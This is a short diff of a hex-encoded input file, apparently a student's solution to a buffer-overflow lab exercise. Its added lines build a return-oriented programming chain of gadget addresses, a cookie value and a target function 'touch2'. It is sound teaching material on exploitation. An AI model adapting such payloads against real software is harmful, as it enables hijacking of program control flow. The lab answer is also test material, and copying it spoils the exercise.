@@ -5,11 +5,7 @@
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-7a 1d 40 
-/* 
-0000000000401d27
-0000000000401d51 more likely
-0000000000401d79 */
-
-
-
+a8 1c 40 00 00 00 00 00                   /* Gadget to pop from stack, shove into rax and ret */
+64 44 3c 2a 00 00 00 00                  /* cookie hex */
+b3 1c 40 00 00 00 00 00                 /* move rax to rdi */
+cf 1a 40 00 00 00 00 00                /* touch2 */
